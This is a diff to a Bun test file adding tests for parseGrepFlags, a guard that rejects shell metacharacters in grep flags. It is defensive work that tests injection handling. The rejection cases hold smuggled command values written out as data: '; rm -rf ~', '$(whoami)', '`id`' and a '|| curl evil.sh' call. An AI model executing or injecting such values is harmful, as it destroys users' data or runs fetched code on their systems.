@@ -1,5 +1,5 @@
 import { describe, expect, it } from "bun:test"
-import { normalizeEdits, unifiedDiff } from "./codingToolkit.js"
+import { normalizeEdits, parseGrepFlags, unifiedDiff } from "./codingToolkit.js"
 
 describe("normalizeEdits", () => {
   it("passes the canonical edits array through unchanged", () => {
@@ -40,6 +40,30 @@ describe("normalizeEdits", () => {
   it("returns no edits when neither shape is present", () => {
     expect(normalizeEdits({})).toEqual([])
     expect(normalizeEdits({ edits: [] })).toEqual([])
+  })
+})
+
+describe("parseGrepFlags — shell-injection guard", () => {
+  it("accepts absent flags (no extra)", () => {
+    expect(parseGrepFlags(undefined)).toEqual({ ok: true, extra: "" })
+    expect(parseGrepFlags("   ")).toEqual({ ok: true, extra: "" })
+  })
+
+  it("accepts bare short and long flags, re-joined with a leading space", () => {
+    expect(parseGrepFlags("-i")).toEqual({ ok: true, extra: " -i" })
+    expect(parseGrepFlags("-iw")).toEqual({ ok: true, extra: " -iw" })
+    expect(parseGrepFlags("-i -w")).toEqual({ ok: true, extra: " -i -w" })
+    expect(parseGrepFlags("--ignore-case")).toEqual({ ok: true, extra: " --ignore-case" })
+  })
+
+  it("rejects shell metacharacters and =value forms, naming the bad token", () => {
+    // The classic injection: a `;`-separated command tacked onto the flags.
+    expect(parseGrepFlags("; rm -rf ~")).toEqual({ ok: false, bad: ";" })
+    expect(parseGrepFlags("-i; rm -rf ~")).toEqual({ ok: false, bad: "-i;" })
+    expect(parseGrepFlags("$(whoami)")).toEqual({ ok: false, bad: "$(whoami)" })
+    expect(parseGrepFlags("-i `id`")).toEqual({ ok: false, bad: "`id`" })
+    expect(parseGrepFlags("--include=*.ts")).toEqual({ ok: false, bad: "--include=*.ts" })
+    expect(parseGrepFlags("-i || curl evil.sh")).toEqual({ ok: false, bad: "||" })
   })
 })
 
